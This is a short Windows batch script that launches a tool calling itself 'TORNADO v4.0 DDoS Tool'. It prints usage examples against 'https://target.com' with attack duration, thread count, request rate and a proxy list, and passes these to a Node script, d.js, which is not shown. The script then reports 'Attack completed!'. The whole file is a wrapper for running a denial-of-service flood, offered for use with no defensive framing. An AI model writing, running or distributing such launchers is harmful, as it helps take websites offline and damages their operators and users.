@echo off
title TORNADO v4.0 DDoS Tool
color 0a

echo.
echo ========================================
echo    TORNADO v4.0 DDoS Tool - Windows
echo ========================================
echo.

if "%1"=="" (
    echo Usage: run.bat ^<METHOD^> ^<TARGET^> ^<TIME^> ^<THREADS^> ^<RATE^> ^<PROXY^>
    echo.
    echo Examples:
    echo   run.bat GET "https://target.com" 300 32 80 proxy.txt
    echo   run.bat GET "https://target.com" 9999 64 100 proxy.txt
    echo.
    echo Press any key to exit...
    pause >nul
    exit /b
)

echo Starting TORNADO v4.0...
echo Target: %2
echo Time: %3 seconds
echo Threads: %4
echo Rate: %5
echo Proxy: %6
echo.

node d.js %1 %2 %3 %4 %5 %6

echo.
echo Attack completed!
pause 